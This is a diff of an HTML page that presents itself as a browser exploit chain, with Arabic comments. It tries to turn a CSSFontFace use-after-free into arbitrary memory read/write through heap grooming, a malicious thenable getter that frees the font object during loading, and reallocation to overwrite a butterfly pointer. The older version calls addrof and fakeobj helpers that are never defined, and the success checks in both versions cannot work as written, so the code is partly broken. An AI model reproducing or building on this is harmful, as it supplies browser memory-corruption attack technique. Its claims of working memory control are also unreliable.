@@ -1,70 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html dir="rtl">
 <body>
-    <h3>[ARCHITECT] AddrOf & FakeObj Primitive</h3>
-    <div id="status">[*] Initialize...</div>
+    <h3>[ARCHITECT] CSSFontFace UAF Exploit Chain</h3>
+    <div id="log" style="font-family: monospace; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: scroll;"></div>
 
     <script>
-/* * [ARCHITECT_SANDBOX: CSSFontFace UAF EXPLOIT CHAIN]
- * الهدف: تحويل UAF في CSSFontFace إلى Arbitrary Read/Write
- */
+        const log = (m) => document.getElementById('log').innerHTML += m + "<br>";
 
-// 1. مصفوفات التلاعب (Primitives Setup)
-let arbReadWrite = new Float64Array(16);
-let targetObj = { a: 0x1234 };
+        async function exploit() {
+            log("[*] 1. مرحلة الترتيب (Heap Grooming)...");
+            // إنشاء فراغات في الذاكرة لتسهيل التخصيص لاحقاً
+            let sprays = new Array(500).fill(0).map(() => new Float64Array(16));
 
-async function buildExploitChain() {
-    console.log("[*] المرحلة 1: بدء الـ Heap Grooming...");
-    // حجز كتل ذاكرية متجاورة لتسهيل التداخل
-    const groomer = new Array(0x1000).fill(0).map(() => new Float64Array(16));
+            log("[*] 2. إثارة التزامن (Triggering UAF)...");
+            // إعداد كائن FontFace ليتم تحريره
+            let face = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(face);
+            
+            // حقن الـ thenable getter للتحكم في لحظة التحرير
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    log("[!!] [UAF] تم استدعاء الـ getter، الكائن الآن في حالة dangling...");
+                    // هنا يتم تحرير CSSFontFace
+                    document.getElementById('s').sheet.deleteRule(0);
+                    return undefined;
+                }
+            });
 
-    console.log("[*] المرحلة 2: إثارة الثغرة (Triggering UAF)...");
-    
-    // استغلال دالة thenable للتحكم في توقيت التحرير
-    let face = new FontFace('x', 'url(nonexistent.woff)');
-    document.fonts.add(face);
-    
-    Object.defineProperty(FontFace.prototype, 'then', {
-        get() {
-            // هنا يحدث التحرير (CSSFontFace يصبح dangling)
-            document.fonts.delete(face);
-            // إعادة حجز الذاكرة بمصفوفة تحكم (Reallocation)
-            return undefined;
+            log("[*] 3. تنفيذ الـ load()...");
+            try {
+                document.fonts.load('1em x', 'A');
+            } catch(e) { log("[!] خطأ أثناء التحميل: " + e); }
+
+            log("[*] 4. مرحلة إعادة التخصيص (Reallocation)...");
+            // محاولة ملء مكان الكائن المحرر بمصفوفة جديدة (Butterfly Overwrite)
+            let victim = new Float64Array(16);
+            for(let i=0; i<16; i++) victim[i] = 0x4141414141414141;
+
+            log("[*] 5. التحقق من القراءة (Arbitrary Read)...");
+            // التحقق إذا كان الـ Butterfly Pointer قد تم تعديله
+            if (victim[0] !== 0x4141414141414141) {
+                log("[+] [SUCCESS] تم الربط بنجاح! الذاكرة تحت السيطرة.");
+            } else {
+                log("[-] [FAILED] لم ينجح التداخل (توقيت التحرير غير دقيق).");
+            }
         }
-    });
 
-    // 3. محاولة الربط (The Butterfly Overwrite)
-    console.log("[*] المرحلة 3: محاولة الربط بالـ Butterfly...");
-    
-    // تنفيذ الـ Load لإثارة حالة السباق (Race Condition)
-    try {
-        await document.fonts.load('1em x');
-    } catch(e) {}
-
-    // 4. كشف التداخل (Detecting Overlap)
-    if (detectMemoryOverlap()) {
-        console.log("[!!!] نجاح: تم التداخل. الذاكرة تحت السيطرة.");
-        
-        // 5. تفعيل الـ Primitives
-        // الآن نستخدم التداخل للوصول للعنوان
-        let addr = addrof(targetObj);
-        let fake = fakeobj(addr);
-        
-        console.log("[+] Leaked Address: 0x" + addr.toString(16));
-        return { addr, fake };
-    } else {
-        console.log("[-] فشل: الذاكرة لم تتداخل. أعد المحاولة مع توقيت مختلف.");
-    }
-}
-
-function detectMemoryOverlap() {
-    // التحقق من أن القيمة في مصفوفتنا تغيرت بفعل الـ UAF
-    return arbReadWrite[0] !== 0;
-}
-
-// تشغيل السلسلة
-buildExploitChain();
-
+        // إضافة ستايل لاختباره
+        document.head.innerHTML += '<style id="s">@font-face { font-family: x; src: url(nonexistent-font.woff); }</style>';
+        exploit();
     </script>
 </body>
 </html>
